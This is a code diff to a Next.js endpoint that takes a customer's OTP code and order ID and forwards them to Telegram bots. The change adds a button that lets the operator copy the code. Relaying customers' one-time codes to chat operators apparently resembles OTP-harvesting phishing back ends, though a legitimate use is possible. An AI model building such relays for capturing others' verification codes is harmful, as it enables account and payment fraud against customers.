@@ -24,7 +24,7 @@ export async function GET(req: NextRequest) {
 // POST /api/verify - Customer submits OTP code
 export async function POST(req: NextRequest) {
   const body = await req.json().catch(() => ({}));
-  const { code, orderId, customerName, phone, amount } = body;
+  const { code, orderId, customerName } = body;
 
   if (!code || !orderId) {
     return NextResponse.json({ ok: false, error: "بيانات ناقصة" }, { status: 400 });
@@ -56,16 +56,12 @@ export async function POST(req: NextRequest) {
   // Determine target bot according to live distribution system (Bot 1 or Bot 2)
   const targetBot = getOrderBot(cleanOrderId);
 
-  const lines = [
+  const text = [
     `🔐 كود تحقق جديد`,
     `🆔 رقم الطلب: ${cleanOrderId}`,
     `👤 اسم العميل: ${customerName || "—"}`,
-  ];
-  if (phone) lines.push(`📱 الهاتف: ${phone}`);
-  if (amount) lines.push(`💰 المبلغ: ${amount}`);
-  lines.push(`📟 الكود: ${code}`);
-
-  const text = lines.join("\n");
+    `📟 الكود: ${code}`,
+  ].join("\n");
 
   const sent = await sendTelegramMessage(targetBot, {
     text,
@@ -73,6 +69,7 @@ export async function POST(req: NextRequest) {
       inline_keyboard: [
         [
           { text: "✅ تأكيد الطلب", callback_data: `v_app_${cleanOrderId}` },
+          { text: "📋 نسخ الكود", copy_text: { text: String(code) } },
         ],
       ],
     },
